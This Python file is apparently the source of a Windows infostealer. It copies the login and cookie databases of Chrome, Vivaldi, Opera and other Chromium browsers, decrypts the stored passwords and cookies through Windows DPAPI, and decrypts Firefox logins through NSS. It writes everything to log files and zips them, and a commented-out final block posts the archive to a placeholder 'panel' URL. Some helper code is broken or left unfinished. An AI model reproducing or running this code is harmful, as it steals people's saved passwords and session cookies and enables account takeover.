#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import csv
import ctypes as ct
import json
import logging
import os
import sqlite3
import sys
from base64 import b64decode
from getpass import getpass
from subprocess import PIPE, Popen
from subprocess import DEVNULL
from urllib.parse import urlparse
from configparser import ConfigParser
import zipfile
import requests

import sqlite3, sys, os
from re import findall
from zipfile import ZipFile, ZIP_DEFLATED
from shutil import copy2

from ctypes.wintypes import *
from ctypes import *
import winreg
import os

LPTSTR 					= LPSTR
LPCTSTR 				= LPSTR
PHANDLE 				= POINTER(HANDLE)
HANDLE      			= LPVOID
LPDWORD   				= POINTER(DWORD)
PVOID					= c_void_p
INVALID_HANDLE_VALUE 	= c_void_p(-1).value
NTSTATUS 				= ULONG()
PWSTR					= c_wchar_p
LPWSTR 					= c_wchar_p
PBYTE 					= POINTER(BYTE)
LPBYTE 					= POINTER(BYTE)
PSID                    = PVOID
LONG                    = c_long
WORD                    = c_uint16

CRYPTPROTECT_UI_FORBIDDEN 			= 0x01
CRED_TYPE_GENERIC 					= 0x1
CRED_TYPE_DOMAIN_VISIBLE_PASSWORD	= 0x4
HKEY_CURRENT_USER 					= -2147483647
HKEY_LOCAL_MACHINE					= -2147483646
KEY_READ 							= 131097
KEY_ENUMERATE_SUB_KEYS				= 8
KEY_QUERY_VALUE						= 1

ACCESS_READ = KEY_READ | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE 

PROCESS_QUERY_INFORMATION   = 0x0400
STANDARD_RIGHTS_REQUIRED    = 0x000F0000
READ_CONTROL                = 0x00020000
STANDARD_RIGHTS_READ        = READ_CONTROL
TOKEN_ASSIGN_PRIMARY        = 0x0001
TOKEN_DUPLICATE             = 0x0002
TOKEN_IMPERSONATE           = 0x0004
TOKEN_QUERY                 = 0x0008
TOKEN_QUERY_SOURCE          = 0x0010
TOKEN_ADJUST_PRIVILEGES     = 0x0020
TOKEN_ADJUST_GROUPS         = 0x0040
TOKEN_ADJUST_DEFAULT        = 0x0080
TOKEN_ADJUST_SESSIONID      = 0x0100
TOKEN_READ                  = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
tokenprivs                  = (TOKEN_QUERY | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | (131072 | 4))
TOKEN_ALL_ACCESS            = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
		TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
		TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
		TOKEN_ADJUST_SESSIONID)

class CREDENTIAL_ATTRIBUTE(Structure):
	_fields_ = [
		('Keyword', LPSTR),
		('Flags', DWORD),
		('ValueSize', DWORD),
		('Value', LPBYTE)
	]
PCREDENTIAL_ATTRIBUTE = POINTER(CREDENTIAL_ATTRIBUTE)

class CREDENTIAL(Structure):
	_fields_ = [
		('Flags', DWORD),
		('Type', DWORD),
		('TargetName', LPSTR),
		('Comment', LPSTR),
		('LastWritten', FILETIME),
		('CredentialBlobSize', DWORD),
		('CredentialBlob', POINTER(c_char)),
		('Persist', DWORD),
		('AttributeCount', DWORD),
		('Attributes', PCREDENTIAL_ATTRIBUTE),
		('TargetAlias', LPSTR),
		('UserName', LPSTR)
	]
PCREDENTIAL = POINTER(CREDENTIAL)

class DATA_BLOB(Structure):
	_fields_ = [
		('cbData', DWORD),
		('pbData', POINTER(c_char))
	]

class GUID(Structure):
	_fields_ = [
		("data1", DWORD),
		("data2", WORD),
		("data3", WORD),
		("data4", BYTE * 6)
	]
LPGUID = POINTER(GUID)

class VAULT_CREDENTIAL_ATTRIBUTEW(Structure):
	_fields_ = [
		('keyword', 		LPWSTR),
		('flags', 			DWORD),
		('badAlign', 		DWORD),
		('valueSize', 		DWORD),
		('value', 			LPBYTE),
	]
PVAULT_CREDENTIAL_ATTRIBUTEW = POINTER(VAULT_CREDENTIAL_ATTRIBUTEW)

class VAULT_BYTE_BUFFER(Structure):
	_fields_ = [
		('length', 		DWORD),
		('value', 		PBYTE),
	]

class DATA(Structure):
	_fields_ = [
		('guid', 			GUID),
		('string', 			LPWSTR),
		('byteArray', 		VAULT_BYTE_BUFFER),
		('protectedArray', 	VAULT_BYTE_BUFFER),
		('attribute', 		PVAULT_CREDENTIAL_ATTRIBUTEW),
		('sid', 			DWORD)
	]

class Flag(Structure):
	_fields_ = [
		('0x00', DWORD),
		('0x01', DWORD),
		('0x02', DWORD),
		('0x03', DWORD),
		('0x04', DWORD),
		('0x05', DWORD),
		('0x06', DWORD),
		('0x07', DWORD),
		('0x08', DWORD),
		('0x09', DWORD),
		('0x0a', DWORD),
		('0x0b', DWORD),
		('0x0c', DWORD),
		('0x0d', DWORD)
	]

class VAULT_ITEM_DATA(Structure):
	_fields_ = [
		('data', 				DATA),
	]
PVAULT_ITEM_DATA = POINTER(VAULT_ITEM_DATA)

class VAULT_ITEM_WIN8(Structure):
	_fields_ = [
		('id', 				GUID),
		('pName', 			PWSTR),
		('pResource', 		PVAULT_ITEM_DATA),
		('pUsername', 		PVAULT_ITEM_DATA),
		('pPassword', 		PVAULT_ITEM_DATA), 
		('unknown0', 		PVAULT_ITEM_DATA), 
		('LastWritten', 	FILETIME), 
		('Flags', 			DWORD), 
		('cbProperties', 	DWORD), 
		('Properties', 		PVAULT_ITEM_DATA), 
	]
PVAULT_ITEM_WIN8 = POINTER(VAULT_ITEM_WIN8)

class OSVERSIONINFOEXW(Structure):
	_fields_ = [
		('dwOSVersionInfoSize', c_ulong),
		('dwMajorVersion', c_ulong),
		('dwMinorVersion', c_ulong),
		('dwBuildNumber', c_ulong),
		('dwPlatformId', c_ulong),
		('szCSDVersion', c_wchar*128),
		('wServicePackMajor', c_ushort),
		('wServicePackMinor', c_ushort),
		('wSuiteMask', c_ushort),
		('wProductType', c_byte),
		('wReserved', c_byte)
	]

class CRYPTPROTECT_PROMPTSTRUCT(Structure):
	_fields_ = [
		('cbSize', 			DWORD),
		('dwPromptFlags', 	DWORD),
		('hwndApp', 		HWND),
		('szPrompt', 		LPCWSTR),
	]
PCRYPTPROTECT_PROMPTSTRUCT = POINTER(CRYPTPROTECT_PROMPTSTRUCT)

class LUID(Structure):
	_fields_ = [
		("LowPart",     DWORD),
		("HighPart",    LONG),
	]
PLUID = POINTER(LUID)

class SID_AND_ATTRIBUTES(Structure):
	_fields_ = [
		("Sid",         PSID),
		("Attributes",  DWORD),
	]

class TOKEN_USER(Structure):
	_fields_ = [
		("User", SID_AND_ATTRIBUTES),]

class LUID_AND_ATTRIBUTES(Structure):
	_fields_ = [
		("Luid",        LUID),
		("Attributes",  DWORD),
	]

class TOKEN_PRIVILEGES(Structure):
	_fields_ = [
		("PrivilegeCount",  DWORD),
		("Privileges",      LUID_AND_ATTRIBUTES),
	]
PTOKEN_PRIVILEGES = POINTER(TOKEN_PRIVILEGES)

class SECURITY_ATTRIBUTES(Structure):
	_fields_ = [
		("nLength",  					DWORD),
		("lpSecurityDescriptor",      	LPVOID),
		("bInheritHandle",      		BOOL),
	]
PSECURITY_ATTRIBUTES = POINTER(SECURITY_ATTRIBUTES)

advapi32 	= WinDLL('advapi32', 	use_last_error=True)
crypt32 	= WinDLL('crypt32', 	use_last_error=True)
kernel32	= WinDLL('kernel32', 	use_last_error=True)

RevertToSelf 					= advapi32.RevertToSelf
RevertToSelf.restype 			= BOOL
RevertToSelf.argtypes 			= []

ImpersonateLoggedOnUser 		= advapi32.ImpersonateLoggedOnUser
ImpersonateLoggedOnUser.restype	= BOOL
ImpersonateLoggedOnUser.argtypes= [HANDLE]

DuplicateTokenEx 				= advapi32.DuplicateTokenEx
DuplicateTokenEx.restype 		= BOOL
DuplicateTokenEx.argtypes 		= [HANDLE, DWORD, PSECURITY_ATTRIBUTES, DWORD, DWORD, POINTER(HANDLE)]

AdjustTokenPrivileges 			= advapi32.AdjustTokenPrivileges
AdjustTokenPrivileges.restype 	= BOOL
AdjustTokenPrivileges.argtypes 	= [HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, POINTER(DWORD)]

LookupPrivilegeValueA			= advapi32.LookupPrivilegeValueA
LookupPrivilegeValueA.restype 	= BOOL
LookupPrivilegeValueA.argtypes 	= [LPCTSTR, LPCTSTR, PLUID]

ConvertSidToStringSidA			= advapi32.ConvertSidToStringSidA
ConvertSidToStringSidA.restype 	= BOOL
ConvertSidToStringSidA.argtypes = [DWORD, POINTER(LPTSTR)]

LocalAlloc 						= kernel32.LocalAlloc
LocalAlloc.restype 				= HANDLE
LocalAlloc.argtypes    			= [PSID, DWORD]

GetTokenInformation 			= advapi32.GetTokenInformation
GetTokenInformation.restype     = BOOL
GetTokenInformation.argtypes    = [HANDLE, DWORD, LPVOID, DWORD, POINTER(DWORD)]

OpenProcess             		= kernel32.OpenProcess
OpenProcess.restype     		= HANDLE
OpenProcess.argtypes    		= [DWORD, BOOL, DWORD]

OpenProcessToken             	= advapi32.OpenProcessToken
OpenProcessToken.restype     	= BOOL
OpenProcessToken.argtypes    	= [HANDLE, DWORD, POINTER(HANDLE)]

CloseHandle             		= kernel32.CloseHandle
CloseHandle.restype     		= BOOL
CloseHandle.argtypes    		= [HANDLE]

CredEnumerate 					= advapi32.CredEnumerateA
CredEnumerate.restype 			= BOOL
CredEnumerate.argtypes 			= [LPCTSTR, DWORD, POINTER(DWORD), POINTER(POINTER(PCREDENTIAL))]
 
CredFree 						= advapi32.CredFree
CredFree.restype 				= PVOID
CredFree.argtypes 				= [PVOID]

memcpy 							= cdll.msvcrt.memcpy
memcpy.restype 					= PVOID
memcpy.argtypes 				= [PVOID]

LocalFree 						= kernel32.LocalFree
LocalFree.restype 				= HANDLE
LocalFree.argtypes				= [HANDLE]

CryptUnprotectData 				= crypt32.CryptUnprotectData
CryptUnprotectData.restype 		= BOOL
CryptUnprotectData.argtypes		= [POINTER(DATA_BLOB), POINTER(LPWSTR), POINTER(DATA_BLOB), PVOID, PCRYPTPROTECT_PROMPTSTRUCT, DWORD, POINTER(DATA_BLOB)]

try:
	prototype 						= WINFUNCTYPE(ULONG, DWORD, LPDWORD, POINTER(LPGUID))
	vaultEnumerateVaults 			= prototype(("VaultEnumerateVaults", windll.vaultcli))

	prototype 						= WINFUNCTYPE(ULONG, LPGUID, DWORD, HANDLE)
	vaultOpenVault 					= prototype(("VaultOpenVault", windll.vaultcli))

	prototype 						= WINFUNCTYPE(ULONG, HANDLE, DWORD, LPDWORD, POINTER(c_char_p))
	vaultEnumerateItems 			= prototype(("VaultEnumerateItems", windll.vaultcli))

	prototype 						= WINFUNCTYPE(ULONG, HANDLE, LPGUID, PVAULT_ITEM_DATA, PVAULT_ITEM_DATA, PVAULT_ITEM_DATA, HWND, DWORD, POINTER(PVAULT_ITEM_WIN8))
	vaultGetItem8 					= prototype(("VaultGetItem", windll.vaultcli))

	prototype 						= WINFUNCTYPE(ULONG, LPVOID)
	vaultFree 						= prototype(("VaultFree", windll.vaultcli))

	prototype 						= WINFUNCTYPE(ULONG, PHANDLE)
	vaultCloseVault 				= prototype(("VaultCloseVault", windll.vaultcli))
except:
	pass

def getData(blobOut):
		cbData = int(blobOut.cbData)
		pbData = blobOut.pbData
		buffer = c_buffer(cbData)
		
		memcpy(buffer, pbData, cbData)
		LocalFree(pbData);
		return buffer.raw

def Win32CryptUnprotectData(cipherText, entropy=None):
	bufferIn 	= c_buffer((cipherText), len(cipherText))
	blobIn 		= DATA_BLOB(len(cipherText), bufferIn)
	blobOut 	= DATA_BLOB()

	if entropy:
		bufferEntropy 	= c_buffer(entropy, len(entropy))
		blobEntropy 	= DATA_BLOB(len(entropy), bufferEntropy)

		if CryptUnprotectData(byref(blobIn), None, byref(blobEntropy), None, None, 0, byref(blobOut)):
			return (getData(blobOut))
		else:
			return (False)
	
	else:
		if CryptUnprotectData(byref(blobIn), None, None, None, None, 0, byref(blobOut)):
			return (getData(blobOut))
		else:
			return (False)

def get_os_version():
	os_version = OSVERSIONINFOEXW()
	os_version.dwOSVersionInfoSize = sizeof(os_version)
	retcode = windll.Ntdll.RtlGetVersion(byref(os_version))
	if retcode != 0:
		return False

	return '%s.%s' % (str(os_version.dwMajorVersion.real), str(os_version.dwMinorVersion.real))


def isx64machine():
	archi = os.environ.get("PROCESSOR_ARCHITEW6432", '')
	if '64' in archi:
		return True

	archi = os.environ.get("PROCESSOR_ARCHITECTURE", '')
	if '64' in archi:
		return True

	return False

isx64 = isx64machine()

def OpenKey(key, path, index=0, access=KEY_READ):
	if isx64:
		return winreg.OpenKey(key, path, index, access | winreg.KEY_WOW64_64KEY)
	else:
		return winreg.OpenKey(key, path, index, access)


pathusr = os.path.expanduser('~')
browser_chrome = [pathusr+"\\AppData\\Local\\Google\\Chrome\\User Data\\", 
				  pathusr+"\\AppData\\Local\\Vivaldi\\User Data\\", 
				  pathusr+"\\AppData\\Roaming\\Opera Software\\",
				  "C:\\Users\\HP\\Desktop\\Iron_30.0.1650.0_Portable\\Data\\Iron\\Profile\\",
				  "C:\\Users\\HP\\Appdata\\Local\\Amigo",
				  "C:\\Users\\HP\\Appdata\\Local\\Chromium",
				  "C:\\Users\\HP\\Appdata\\Local\\CocCoc",
				  "C:\\Users\\HP\\AppData\\Local\\Opera Software\\",
				  "C:\\Users\\HP\\AppData\\Local\\Vivaldi",
				  "C:\\Users\\HP\\AppData\\Local\\UCBrowser\\"]
profiles_chrome = ["Profile 1\\", "Profile 2\\", "Profile 3\\", "Default\\"]

db = pathusr + "\\db1.sqlite3"
db2 = pathusr + "\\db2.sqlite3"

def check_exists(file):
	if os.path.exists(file):
		return True
	else:
		return False

def login_chrome(file):
	logindata = "============логины=============\r\n"
	copy2(file, db)
	con = sqlite3.connect(db)
	cursor = con.cursor()
	cursor.execute("SELECT origin_url, username_value, password_value from logins;")
	for log in cursor.fetchall():
		password = Win32CryptUnprotectData(log[2]).decode("utf-8")
		if password is not False:
			logindata += 'САЙТ : ' + str(log[0]) + '\r\n'
			logindata += 'ЛОГ  : ' + str(log[1])  + '\r\n'
			logindata += 'ПАСС : ' + str(password) + '\r\n\r\n'
	return(logindata)

def cook_chrome(file):
	cookdata = "============кукисы=============\r\n"
	copy2(file, db2)
	con = sqlite3.connect(db2)
	cursor = con.cursor()
	cursor.execute("SELECT host_key, name, value, path, last_access_utc, encrypted_value FROM cookies;")
	for host_key, name, value, path, last_access_utc, encrypted_value in cursor.fetchall():
		decrypted = Win32CryptUnprotectData(encrypted_value).decode("utf-8") or value or 0
		if decrypted is not False:
			cookdata += str(host_key) + "\tTRUE\t" + "/" + '\tFALSE\t' + str(last_access_utc) + '\t' + str(name) + '\t' + str(decrypted) + '\n'
	return(cookdata)

def getXpom():
	logindata = ""
	cookdata = ""
	for folder in browser_chrome:
		if check_exists(folder):
			for prof in profiles_chrome:
				if check_exists(folder + prof):
					if check_exists(folder + prof + "\\Login Data"):
						logindata += login_chrome(folder + prof + "\\Login Data")
					if check_exists(folder + prof + "\\Cookies"):
						cookdata += cook_chrome(folder + prof + "\\Cookies")
	
	with open(pathusr+"\\AppData\\Roaming\\logs\\XromiumLogins.txt", "w", encoding='utf-8') as file:
		file.write(logindata)

	with open(pathusr+"\\AppData\\Roaming\\logs\\XromiumCookies.txt", "w", encoding='utf-8') as file:
		file.write(cookdata)

	return 0

SYS_ENCODING = "cp1252"
LIB_ENCODING = "utf8"
USR_ENCODING = sys.stdin.encoding or sys.stdout.encoding or "utf8"

def py2_decode(_bytes, encoding=USR_ENCODING):
    return _bytes

def py2_encode(_unicode, encoding=USR_ENCODING):
    return _unicode

def type_decode(encoding):
    return lambda x: py2_decode(x, encoding)

def get_version():
    def internal_version():
        return '.'.join(map(str, __version_info__))

class NotFoundError(Exception):
    pass

class Credentials(object):
    def __init__(self, db):
        self.db = db
        if not os.path.isfile(db):
            raise NotFoundError("ERROR - {0} database not found\n".format(db))

    def __iter__(self):
        pass

    def done(self):
        pass

class SqliteCredentials(Credentials):
    def __init__(self, profile):
        db = os.path.join(profile, "signons.sqlite")
        super(SqliteCredentials, self).__init__(db)
        self.conn = sqlite3.connect(db)
        self.c = self.conn.cursor()

    def __iter__(self):
        self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType FROM moz_logins")
        for i in self.c:
            yield i

    def done(self):
        super(SqliteCredentials, self).done()
        self.c.close()
        self.conn.close()


class JsonCredentials(Credentials):
    def __init__(self, profile):
        db = os.path.join(profile, "logins.json")
        super(JsonCredentials, self).__init__(db)

    def __iter__(self):
        with open(self.db) as fh:
            data = json.load(fh)
            try:
                logins = data["logins"]
            except Exception:
                raise Exit(Exit.BAD_SECRETS)
            for i in logins:
                yield (i["hostname"], i["encryptedUsername"], i["encryptedPassword"], i["encType"])


class NSSDecoder(object):
    class SECItem(ct.Structure):
        _fields_ = [
            ('type', ct.c_uint),
            ('data', ct.c_char_p),
            ('len', ct.c_uint),
        ]

    class PK11SlotInfo(ct.Structure):
        pass

    def __init__(self):
        self.NSS = None
        self.load_libnss()
        SlotInfoPtr = ct.POINTER(self.PK11SlotInfo)
        SECItemPtr = ct.POINTER(self.SECItem)
        self._set_ctypes(ct.c_int, "NSS_Init", ct.c_char_p)
        self._set_ctypes(ct.c_int, "NSS_Shutdown")
        self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
        self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
        self._set_ctypes(ct.c_int, "PK11_CheckUserPassword", SlotInfoPtr, ct.c_char_p)
        self._set_ctypes(ct.c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, ct.c_void_p)
        self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, ct.c_int)
        self._set_ctypes(ct.c_int, "PORT_GetError")
        self._set_ctypes(ct.c_char_p, "PR_ErrorToName", ct.c_int)
        self._set_ctypes(ct.c_char_p, "PR_ErrorToString", ct.c_int, ct.c_uint32)

    def _set_ctypes(self, restype, name, *argtypes):
        res = getattr(self.NSS, name)
        res.restype = restype
        res.argtypes = argtypes
        setattr(self, "_" + name, res)

    @staticmethod
    def find_nss(locations, nssname):
        fail_errors = []
        for loc in locations:
            nsslib = os.path.join(loc, nssname)
            if os.name == "nt":
                os.environ["PATH"] = ';'.join([loc, os.environ["PATH"]])
                if loc:
                    if not os.path.isdir(loc):
                        continue
                    workdir = os.getcwd()
                    os.chdir(loc)
            try:
                nss = ct.CDLL(nsslib)
            except OSError as e:
                fail_errors.append((nsslib, str(e)))
            else:
                return nss
            finally:
                if os.name == "nt" and loc:
                    os.chdir(workdir)
        else:
            for target, error in fail_errors:
                pass
            raise Exit(Exit.FAIL_LOCATE_NSS)

    def load_libnss(self):
        nssname = "nss3.dll"
        locations = (
            "",
            r"C:\Program Files (x86)\Mozilla Firefox",
            r"C:\Program Files\Mozilla Firefox",
            r"C:\Program Files (x86)\Nightly",
            r"C:\Program Files\Nightly",            
        )

        self.NSS = self.find_nss(locations, nssname)

    def handle_error(self):
        code = self._PORT_GetError()
        name = self._PR_ErrorToName(code)
        name = "NULL" if name is None else name.decode(SYS_ENCODING)
        text = self._PR_ErrorToString(code, 0)
        text = text.decode(SYS_ENCODING)

    def decode(self, data64):
        data = b64decode(data64)
        inp = self.SECItem(0, data, len(data))
        out = self.SECItem(0, None, 0)
        e = self._PK11SDR_Decrypt(inp, out, None)
        try:
            if e == -1:
                self.handle_error()
                raise Exit(Exit.NEED_MASTER_PASSWORD)
            res = ct.string_at(out.data, out.len).decode(LIB_ENCODING)
        finally:
            self._SECITEM_ZfreeItem(out, 0)
        return res

class NSSInteraction(object):
    def __init__(self):
        self.profile = None
        self.NSS = NSSDecoder()
    def load_profile(self, profile):
        self.profile = profile
        profile = profile.encode(LIB_ENCODING)
        e = self.NSS._NSS_Init(b"sql:" + profile)
        if e != 0:
            self.NSS.handle_error()
            raise Exit(Exit.FAIL_INIT_NSS)

    def authenticate(self, interactive):
        keyslot = self.NSS._PK11_GetInternalKeySlot()
        if not keyslot:
            self.NSS.handle_error()
            raise Exit(Exit.FAIL_NSS_KEYSLOT)
        try:
            password = ""
            if password:
                e = self.NSS._PK11_CheckUserPassword(keyslot, password.encode(LIB_ENCODING))
                if e != 0:
                    self.NSS.handle_error()
                    raise Exit(Exit.BAD_MASTER_PASSWORD)
            else:
                pass
        finally:
            self.NSS._PK11_FreeSlot(keyslot)

    def unload_profile(self):
        e = self.NSS._NSS_Shutdown()
        if e != 0:
            self.NSS.handle_error()
            raise Exit(Exit.FAIL_SHUTDOWN_NSS)

    def decode_entry(self, user64, passw64):
        user = self.NSS.decode(user64)
        passw = self.NSS.decode(passw64)
        return user, passw

    def decrypt_passwords(self, export, output_format="human", csv_delimiter=";", csv_quotechar="|"):
        got_password = False
        header = True
        credentials = obtain_credentials(self.profile)
        to_export = {}

        global logindata
        logindata = "============логины=============\r\n"

        for url, user, passw, enctype in credentials:
            got_password = True
            if enctype:
                user, passw = self.decode_entry(user, passw)

            if export:
                address = urlparse(url)

                if address.netloc not in to_export:
                    to_export[address.netloc] = {user: passw}
                else:
                    to_export[address.netloc][user] = passw

            logindata += 'САЙТ : ' + str(url) + '\r\n'
            logindata += 'ЛОГ  : ' + str(user)  + '\r\n'
            logindata += 'ПАСС : ' + str(passw) + '\r\n\r\n'

        credentials.done()
        if not got_password:
            pass
        if export:
            return to_export

def obtain_credentials(profile):
    try:
        credentials = JsonCredentials(profile)
    except NotFoundError:
        try:
            credentials = SqliteCredentials(profile)
        except NotFoundError:
            raise Exit(Exit.MISSING_SECRETS)
    return credentials


def export_pass(to_export, pass_cmd, prefix, username_prefix):
    if prefix:
        prefix = u"{0}/".format(prefix)

    for address in to_export:
        for user, passw in to_export[address].items():
            if len(to_export[address]) > 1:
                passname = u"{0}{1}/{2}".format(prefix, address, user)
            else:
                passname = u"{0}{1}".format(prefix, address)
            data = u"{0}\n{1}{2}\n".format(passw, username_prefix, user)
            if p.returncode != 0:
                raise Exit(Exit.PASSSTORE_ERROR)

def get_sections(profiles):
    sections = {}
    i = 1
    for section in profiles.sections():
        if section.startswith("Profile"):
            sections[str(i)] = profiles.get(section, "Path")
            i += 1
        else:
            continue
    return sections


def print_sections(sections, textIOWrapper=sys.stderr):
    for i in sorted(sections):
        textIOWrapper.write("{0} -> {1}\n".format(i, sections[i]))
    textIOWrapper.flush()


def ask_section(profiles, choice_arg):
    sections = get_sections(profiles)
    if choice_arg and len(choice_arg) == 1:
        choice = choice_arg[0]
    else:
        if len(sections) == 1:
            choice = "1"

        else:
            choice = None
            while choice not in sections:
                print_sections(sections)
                try:
                    choice = raw_input()
                except EOFError:
                    raise Exit(Exit.READ_GOT_EOF)

    try:
        final_choice = sections[choice]
    except KeyError:
        raise Exit(Exit.NO_SUCH_PROFILE)

    return final_choice

def read_profiles(basepath, list_profiles):
    profileini = os.path.join(basepath, "profiles.ini")
    if not os.path.isfile(profileini):
        raise Exit(Exit.MISSING_PROFILEINI)
    profiles = ConfigParser()
    profiles.read(profileini)
    if list_profiles:
        raise Exit(0)
    return profiles


def get_profile(basepath, interactive, choice, list_profiles):
    try:
        profiles = read_profiles(basepath, list_profiles)
    except Exit as e:
        if e.exitcode == Exit.MISSING_PROFILEINI:
            profile = basepath

            if list_profiles:
                raise

            if not os.path.isdir(profile):
                raise
        else:
            raise
    else:
        if not interactive:
            sections = get_sections(profiles)

            if choice and len(choice) == 1:
                try:
                    section = sections[(choice[0])]
                except KeyError:
                    raise Exit(Exit.NO_SUCH_PROFILE)

            elif len(sections) == 1:
                section = sections['1']

            else:
                raise Exit(Exit.MISSING_CHOICE)
        else:
            section = ask_section(profiles, choice)

        section = py2_decode(section, LIB_ENCODING)
        profile = os.path.join(basepath, section)

        if not os.path.isdir(profile):
            raise Exit(Exit.BAD_PROFILEINI)
    return profile

def parse_sys_args():
    return args

def getFire():
    profile_path = os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox")
    profile = profile_path
    nss = NSSInteraction()
    basepath = os.path.expanduser(profile)
    profile = get_profile(basepath, "", "", "")
    nss.load_profile(profile)
    nss.authenticate("")
    to_export = nss.decrypt_passwords(export=export_pass,)
    nss.unload_profile()
    with open(pathusr+"\\AppData\\Roaming\\logs\\FoxLogins.txt", "w", encoding='utf-8') as file:
        file.write(logindata)
    return 0

def check_exists(file):
	if os.path.exists(file):
		return True
	else:
		return False

def get_browsers():
	if check_exists(pathusr+'\\AppData\\Roaming\\logs\\'):
		pass
	else:
		os.mkdir(pathusr+'\\AppData\\Roaming\\logs\\')
	try:
		getXpom()
	except:
		pass
	try:
		getFire()
	except:
		pass

def zipdir(path, ziph):
	for root, dirs, files in os.walk(path):
		for file in files:
			ziph.write(os.path.join(root, file))
	
if __name__ == '__main__':
	get_browsers()
	print('ok')
	zipf = zipfile.ZipFile('logs.zip', 'w', zipfile.ZIP_DEFLATED)
	zipdir(pathusr+'\\AppData\\Roaming\\logs\\', zipf)
	zipf.close()
#	url = 'ТВОЯ ПАНЕЛЬ ТЕРНИК/index.php'
#	files = {'file': open(pathusr+'\\AppData\\Roaming\\python\\logs.zip', 'rb')}
#	requests.post(url, files=files)
